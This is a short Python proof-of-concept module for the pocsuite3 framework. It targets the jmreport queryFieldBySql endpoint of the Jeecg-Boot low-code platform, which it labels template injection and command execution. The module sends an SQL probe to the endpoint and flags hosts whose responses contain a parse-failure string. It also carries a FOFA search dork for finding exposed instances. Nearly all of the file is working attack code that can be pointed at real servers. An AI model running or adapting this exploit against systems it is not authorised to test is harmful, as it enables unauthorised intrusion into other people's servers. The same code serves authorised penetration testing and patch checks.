import json

from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
    CEye,
    get_listener_ip, get_listener_port, REVERSE_PAYLOAD
)
from urllib.parse import urljoin
minimum_version_required('1.9.11')


class POC(POCBase):
    name = 'Jeecg-Boot模版注入'
    vulType = 'Command Execution'
    desc = 'Vulnerability description'
    pocDesc = 'User manual of poc'
    dork = {'fofa': 'app="JeecgBoot-企业级低代码平台"'}

    def _exploit(self):
        vuln_path = "/jeecg-boot/jmreport/queryFieldBySql"
        header = {"Content-Type":"application/json"}
        string = {"sql": "select user();"}
        datas = json.dumps(string)
        url = urljoin(self.url, vuln_path)
        res = requests.post(url, data=datas,headers=header,verify=False,timeout=5)
        return res.text

    def _verify(self):
        result = {}
        parame = self._exploit()
        if "解析失败" in parame:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['url'] = self.url
        return self.parse_output(result)


register_poc(POC)
